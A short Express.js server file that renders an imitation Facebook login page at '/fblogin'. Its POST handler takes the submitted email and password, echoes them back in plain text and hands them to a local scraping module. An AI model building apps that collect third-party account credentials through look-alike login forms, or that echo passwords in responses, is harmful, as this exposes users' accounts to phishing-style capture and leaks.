// Load Node modules
var express = require('express');
const ejs = require('ejs');
var app = express();
const bodyParser = require('body-parser'); 
const scrape = require("./scrape");

// Middleware / Routing 
app.use(bodyParser.urlencoded({ extended: true})); 
app.use(express.static('public'));
app.set('view engine', 'ejs');
app.listen(8080, function(){ 
    console.log("Server running on port 8080");
});

// *** GET Routes - display pages ***

// HOME ROUTE
app.get('/', function (req, res) {
    res.render('pages/home');
});

// LOGIN PROMPT
app.get('/prompt', function (req, res) {
    res.render('pages/prompt');
});

// FACEBOOK LOG IN 
app.get('/fblogin', function (req, res) {
    res.render('pages/fblogin');
}); 

// FACEBOOK LOG IN POST REQUEST
app.post('/fblogin', (req, res) => {
    // Insert Login Code Here
    let email = req.body.email;
    let password = req.body.password;
    res.send(`Username: ${email} Password: ${password}`);

    const randomString = scrape.getData(email, password);
    console.log(randomString); 
});
